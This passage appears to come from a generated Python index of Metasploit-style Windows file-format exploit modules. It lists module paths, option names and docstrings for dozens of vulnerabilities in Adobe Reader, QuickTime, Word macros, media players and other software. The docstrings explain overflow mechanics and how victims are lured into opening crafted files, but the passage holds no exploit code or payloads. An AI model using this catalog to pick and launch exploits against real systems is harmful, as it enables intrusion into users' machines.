		path = 'windows/fileformat/apple_quicktime_rdrf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_adobe_cooltype_sing(object):
		"""
		
          This module exploits a vulnerability in the Smart INdependent Glyplets (SING) table
        handling within versions 8.2.4 and 9.3.4 of Adobe Reader. Prior versions are
        assumed to be vulnerable as well.
      
		"""

		path = 'windows/fileformat/adobe_cooltype_sing'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_office_word_macro(object):
		"""
		
        This module generates a macro-enabled Microsoft Office Word document. The comments
        metadata in the data is injected with a Base64 encoded payload, which will be
        decoded by the macro and execute as a Windows executable.

        For a successful attack, the victim is required to manually enable macro execution.
      
		"""

		path = 'windows/fileformat/office_word_macro'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			BODY = 'BODY'

	class windows_fileformat_blazedvd_hdtv_bof(object):
		"""
		
          This module exploits a vulnerability found in BlazeVideo HDTV Player's filename
        handling routine.  When supplying a string of input data embedded in a .plf file,
        the MediaPlayerCtrl.dll component will try to extract a filename by using
        PathFindFileNameA(), and then copies whatever the return value is on the stack by
        using an inline strcpy.  As a result, if this input data is long enough, it can cause
        a stack-based buffer overflow, which may lead to arbitrary code execution under the
        context of the user.
      
		"""

		path = 'windows/fileformat/blazedvd_hdtv_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_adobe_media_newplayer(object):
		"""
		
        This module exploits a use after free vulnerability in Adobe Reader and Adobe Acrobat
        Professional versions up to and including 9.2.
      
		"""

		path = 'windows/fileformat/adobe_media_newplayer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_adobe_geticon(object):
		"""
		
          This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat.
        Affected versions include < 7.1.1, < 8.1.3, and < 9.1. By creating a specially
        crafted pdf that a contains malformed Collab.getIcon() call, an attacker may
        be able to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/adobe_geticon'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			required_PDF_Obfuscate = 'PDF::Obfuscate'
			required_PDF_Method = 'PDF::Method'
			required_PDF_Encoder = 'PDF::Encoder'
			required_PDF_MultiFilter = 'PDF::MultiFilter'

	class windows_fileformat_gta_samp(object):
		"""
		
          This module exploits a stack-based buffer overflow in GTA SA-MP Server.
        This buffer overflow occurs when the application attempts to open a malformed
        server.cfg file.  To exploit this vulnerability, an attacker must send the
        victim a server.cfg file and have them run samp-server.exe.
      
		"""

		path = 'windows/fileformat/gta_samp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_adobe_reader_u3d(object):
		"""
		
          This module exploits a vulnerability in the U3D handling within
        versions 9.x through 9.4.6 and 10 through to 10.1.1 of Adobe Reader.
        The vulnerability is due to the use of uninitialized memory.

        Arbitrary code execution is achieved by embedding specially crafted U3D
        data into a PDF document. A heap spray via JavaScript is used in order to
        ensure that the memory used by the invalid pointer issue is controlled.
      
		"""

		path = 'windows/fileformat/adobe_reader_u3d'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			OBFUSCATE = 'OBFUSCATE'

	class windows_fileformat_wm_downloader_m3u(object):
		"""
		
          This module exploits a buffer overflow in WM Downloader v3.1.2.2. When
        the application is used to import a specially crafted m3u file, a buffer overflow occurs
        allowing arbitrary code execution.
      
		"""

		path = 'windows/fileformat/wm_downloader_m3u'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_aviosoft_plf_buf(object):
		"""
		
            This module exploits a vulnerability found in Aviosoft Digital TV Player
          Pro version 1.x.  An overflow occurs when the process copies the content of a
          playlist file on to the stack, which may result aribitrary code execution under
          the context of the user.
        
		"""

		path = 'windows/fileformat/aviosoft_plf_buf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_realplayer_ver_attribute_bof(object):
		"""
		
        This module exploits a stack-based buffer overflow vulnerability in
        version 16.0.3.51 and 16.0.2.32 of RealNetworks RealPlayer, caused by
        improper bounds checking of the version and encoding attributes inside
        the XML declaration.

        By persuading the victim to open a specially-crafted .RMP file, a
        remote attacker could execute arbitrary code on the system or cause
        the application to crash.
      
		"""

		path = 'windows/fileformat/realplayer_ver_attribute_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_winamp_maki_bof(object):
		"""
		
          This module exploits a stack based buffer overflow in Winamp 5.55. The flaw
        exists in the gen_ff.dll and occurs while parsing a specially crafted MAKI file,
        where memmove is used with in a insecure way with user controlled data.

        To exploit the vulnerability the attacker must convince the attacker to install the
        generated mcvcore.maki file in the "scripts" directory of the default "Bento" skin,
        or generate a new skin using the crafted mcvcore.maki file. The module has been
        tested successfully on Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/winamp_maki_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_mswin_tiff_overflow(object):
		"""
		
          This module exploits a vulnerability found in Microsoft's Tagged Image File Format.
          It was originally discovered in the wild, targeting Windows XP and Windows Server 2003
          users running Microsoft Office, specifically in the Middle East and South Asia region.

          The flaw is due to a DWORD value extracted from the TIFF file that is embedded as a
          drawing in Microsoft Office, and how it gets calculated with user-controlled inputs,
          and stored in the EAX register. The 32-bit register will run out of storage space to
          represent the large vlaue, which ends up being 0, but it still gets pushed as a
          dwBytes argumenet (size) for a HeapAlloc call. The HeapAlloc function will allocate a
          chunk anyway with size 0, and the address of this chunk is used as the destination buffer
          of a memcpy function, where the source buffer is the EXIF data (an extended image format
          supported by TIFF), and is also user-controlled. A function pointer in the chunk returned
          by HeapAlloc will end up being overwritten by the memcpy function, and then later used
          in OGL!GdipCreatePath. By successfully controlling this function pointer, and the
          memory layout using ActiveX, it is possible to gain arbitrary code execution under the
          context of the user.
        
		"""

		path = 'windows/fileformat/mswin_tiff_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ms_visual_basic_vbp(object):
		"""
		
          This module exploits a stack oveflow in Microsoft Visual
        Basic 6.0. When a specially crafted vbp file containing a long
        reference line, an attacker may be able to execute arbitrary
        code.
      
		"""

		path = 'windows/fileformat/ms_visual_basic_vbp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ideal_migration_ipj(object):
		"""
		
          This module exploits a stack buffer overflow in versions v9.7
        through v10.5 of IDEAL Administration and versions 4.5 and 4.51 of
        IDEAL Migration. All versions are suspected to be vulnerable.
        By creating a specially crafted ipj file, an an attacker may be able
        to execute arbitrary code.

        NOTE: IDEAL Administration 10.5 is compiled with /SafeSEH
      
		"""

		path = 'windows/fileformat/ideal_migration_ipj'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_millenium_mp3_pls(object):
		"""
		
          This module exploits a stack-based buffer overflow in Millenium MP3 Studio 2.0.
          An attacker must send the file to victim and the victim must open the file.
          Alternatively it may be possible to execute code remotely via an embedded
          PLS file within a browser, when the PLS extention is registered to Millenium MP3 Studio.
          This functionality has not been tested in this module.
      
		"""

		path = 'windows/fileformat/millenium_mp3_pls'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_scadaphone_zip(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in
        version 5.3.11.1230 of scadaTEC's ScadaPhone.

        In order for the command to be executed, an attacker must convince someone to
        load a specially crafted project zip file with ScadaPhone.
        By doing so, an attacker can execute arbitrary code as the victim user.
      
		"""

		path = 'windows/fileformat/scadaphone_zip'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_moxa_mediadbplayback(object):
		"""
		
        This module exploits a stack buffer overflow in MOXA_ActiveX_SDK. When
        sending an overly long string to the PlayFileName() of MediaDBPlayback.DLL (2.2.0.5)
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/moxa_mediadbplayback'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_cutezip_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in version 2.1
        of CuteZIP.

        In order for the command to be executed, an attacker must convince the target user
        to open a specially crafted zip file with CuteZIP. By doing so, an attacker can
        execute arbitrary code as the target user.
      
		"""

		path = 'windows/fileformat/cutezip_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_safenet_softremote_groupname(object):
		"""
		
        This module exploits a stack buffer overflow in SafeNet SoftRemote
        Security Policy Editor <= 10.8.5. When an attacker
        creates a specially formatted security policy with an
        overly long GROUPNAME argument, it is possible to execute
        arbitrary code.
      
		"""

		path = 'windows/fileformat/safenet_softremote_groupname'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_publishit_pui(object):
		"""
		
          This module exploits a stack based buffer overflow in Publish-It when
          processing a specially crafted .PUI file. This vulnerability could be
          exploited by a remote attacker to execute arbitrary code on the target
          machine by enticing a user of Publish-It to open a malicious .PUI file.
      
		"""

		path = 'windows/fileformat/publishit_pui'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_mplayer_m3u_bof(object):
		"""
		
        This module exploits a stack-based buffer overflow vulnerability in
        MPlayer Lite r33064, caused by improper bounds checking of an URL entry.

        By persuading the victim to open a specially-crafted .M3U file, specifically by
        drag-and-dropping it to the player, a remote attacker can execute arbitrary
        code on the system.
      
		"""

		path = 'windows/fileformat/mplayer_m3u_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_csound_getnum_bof(object):
		"""
		
          This module exploits a buffer overflow in Csound before 5.16.6.
        The overflow occurs when trying to import a malicious hetro file
        from tabular format.
        In order to achieve exploitation the user should import the malicious
        file through csound with a command like "csound -U het_import msf.csd file.het".
        This exploit doesn't work if the "het_import" command is used directly
        to convert the file.
      
		"""

		path = 'windows/fileformat/csound_getnum_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_ccmplayer_m3u_bof(object):
		"""
		
          This module exploits a stack based buffer overflow in CCMPlayer 1.5. Opening
        a m3u playlist with a long track name, a SEH exception record can be overwritten
        with parts of the controllable buffer. SEH execution is triggered after an
        invalid read of an injectible address, thus allowing arbitrary code execution.
        This module works on multiple Windows platforms including: Windows XP SP3,
        Windows Vista, and Windows 7.
      
		"""

		path = 'windows/fileformat/ccmplayer_m3u_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_easycdda_pls_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in
        Easy CD-DA Recorder 2007 caused by an overlong string in a playlist entry.
        By persuading the victim to open a specially-crafted PLS file, a
        remote attacker can execute arbitrary code on the system or cause
        the application to crash. This module has been tested successfully on
        Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/easycdda_pls_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_real_networks_netzip_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in
        version 7.5.1 86 of Real Networks Netzip Classic.
        In order for the command to be executed, an attacker must convince someone to
        load a specially crafted zip file with NetZip Classic.
        By doing so, an attacker can execute arbitrary code as the victim user.
      
		"""

		path = 'windows/fileformat/real_networks_netzip_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			required_CONTENTNAME = 'CONTENTNAME'

	class windows_fileformat_ibm_forms_viewer_fontname(object):
		"""
		
        This module exploits a stack-based buffer overflow in IBM Forms Viewer. The vulnerability
        is due to a dangerous usage of a strcpy-like function, and occurs while parsing malformed
        XFDL files containing a long fontname value. This module has been tested successfully on IBM
        Forms Viewer 4.0 on Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/ibm_forms_viewer_fontname'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_shaper_pdf_bof(object):
		"""
		
          PDF Shaper is prone to a security vulnerability when processing PDF files.
        The vulnerability appear when we use Convert PDF to Image and use a specially
        crafted PDF file. This module has been tested successfully on Win Xp, Win 7,
        Win 8, Win 10.
      
		"""

		path = 'windows/fileformat/shaper_pdf_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			required_PDF_Obfuscate = 'PDF::Obfuscate'
			required_PDF_Method = 'PDF::Method'
			required_PDF_Encoder = 'PDF::Encoder'
			required_PDF_MultiFilter = 'PDF::MultiFilter'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_mediajukebox(object):
		"""
		
          This module exploits a stack buffer overflow in Media Jukebox 8.0.400
        by creating a specially crafted m3u or pls file.
      
		"""

		path = 'windows/fileformat/mediajukebox'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_dvdx_plf_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow on DVD X Player 5.5 Pro and
        Standard.  By supplying a long string of data in a plf file (playlist), the
        MediaPlayerCtrl.dll component will attempt to extract a filename out of the string,
        and then copy it on the stack without any proper bounds checking, which casues a
        buffer overflow, and results arbitrary code execution under the context of the user.

          This module has been designed to target common Windows systems such as:
        Windows XP SP2/SP3, Windows Vista, and Windows 7.
      
		"""

		path = 'windows/fileformat/dvdx_plf_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_vuplayer_m3u(object):
		"""
		
          This module exploits a stack over flow in VUPlayer <= 2.49. When
          the application is used to open a specially crafted m3u file, an buffer is overwritten allowing
          for the execution of arbitrary code.
      
		"""

		path = 'windows/fileformat/vuplayer_m3u'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_beetel_netconfig_ini_bof(object):
		"""
		
        This module exploits a stack-based buffer overflow on Beetel Connection Manager. The
        vulnerability exists in the parising of the UserName parameter in the NetConfig.ini
        file. The module has been tested successfully on PCW_BTLINDV1.0.0B04 over Windows XP
        SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/beetel_netconfig_ini_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'
			required_SECTION = 'SECTION'

	class windows_fileformat_ursoft_w32dasm(object):
		"""
		
          This module exploits a buffer overflow in W32Dasm <= v8.93.
        By creating a malicious file and convincing a user to disassemble
        the file with a vulnerable version of W32Dasm, the Imports/Exports
        function is copied to the stack and arbitrary code may be executed
        locally as the user.
      
		"""

		path = 'windows/fileformat/ursoft_w32dasm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_irfanview_jpeg2000_bof(object):
		"""
		
        This module exploits a stack-based buffer overflow vulnerability in
        version <= 4.3.2.0 of Irfanview's JPEG2000.dll plugin. This exploit has
        been tested on a specific version of irfanview (v4.3.2), although other
        versions may work also. The vulnerability is triggered via parsing an
        invalid qcd chunk structure and specifying a malformed qcd size and
        data.

        Payload delivery and vulnerability trigger can be executed in multiple
        ways. The user can double click the file, use the file dialog, open via
        the icon and drag/drop the file into Irfanview's window. An egg hunter
        is used for stability.
      
		"""

		path = 'windows/fileformat/irfanview_jpeg2000_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_watermark_master(object):
		"""
		
          This module exploits a stack based buffer overflow in Watermark Master 2.2.23 when
          processing a specially crafted .WCF file. This vulnerability could be
          exploited by a remote attacker to execute arbitrary code on the target
          machine by enticing a user of Watermark Master to open a malicious .WCF file.
      
		"""

		path = 'windows/fileformat/watermark_master'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_videospirit_visprj(object):
		"""
		
          This module exploits a stack buffer overflow in Video Spirit <= 1.70.
        When opening a malicious project file (.visprj), a stack buffer overflow occurs,
        resulting in arbitrary code execution.
        This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.
      
		"""

		path = 'windows/fileformat/videospirit_visprj'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ca_cab(object):
		"""
		
          This module exploits a stack buffer overflow in CA eTrust Antivirus 8.1.637.
          By creating a specially crafted CAB file, an an attacker may be able
          to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/ca_cab'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_microp_mppl(object):
		"""
		
          This module exploits a vulnerability found in MicroP 0.1.1.1600.  A stack-based
        buffer overflow occurs when the content of a .mppl file gets copied onto the stack,
        which overwrites the lpFileName parameter of a CreateFileA() function, and results
        arbitrary code execution under the context of the user.
      
		"""

		path = 'windows/fileformat/microp_mppl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_visiwave_vwr_type(object):
		"""
		
        This module exploits a vulnerability found in VisiWave's Site Survey Report application.
        When processing .VWR files, VisiWaveReport.exe attempts to match a valid pointer based on the 'Type'
        property (valid ones include 'Properties', 'TitlePage', 'Details', 'Graph', 'Table', 'Text',
        'Image'), but if a match isn't found, the function that's supposed to handle this routine
        ends up returning the input as a pointer, and later used in a CALL DWORD PTR [EDX+10]
        instruction.  This allows attackers to overwrite it with any arbitrary value, and results code
        execution.  A patch is available at visiwave.com; the fix is done by XORing the return value as
        null if no match is found, and then it is validated before use.

        NOTE: During installation, the application will register two file handle's, VWS and VWR and allows a
        victim user to 'double click' the malicious VWR file and execute code.  This module was also built
        to bypass ASLR and DEP.
      
		"""

		path = 'windows/fileformat/visiwave_vwr_type'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_djvu_imageurl(object):
		"""
		
          This module exploits a stack buffer overflow in DjVu ActiveX Component. When sending an
        overly long string to the ImageURL() property of DjVu_ActiveX_MSOffice.dll (3.0)
        an attacker may be able to execute arbitrary code. This control is not marked safe
        for scripting, so choose your attack vector accordingly.
      
		"""

		path = 'windows/fileformat/djvu_imageurl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_openoffice_ole(object):
		"""
		
          This module exploits a vulnerability in OpenOffice 2.3.1 and 2.3.0 on
        Microsoft Windows XP SP3.

        By supplying a OLE file with a malformed DocumentSummaryInformation stream, an
        attacker can gain control of the execution flow, which results arbitrary code
        execution under the context of the user.
      
		"""

		path = 'windows/fileformat/openoffice_ole'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_apple_quicktime_pnsize(object):
		"""
		
          This module exploits a vulnerability in Apple QuickTime Player 7.60.92.0.
        When opening a .mov file containing a specially crafted PnSize value, an attacker
        may be able to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/apple_quicktime_pnsize'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

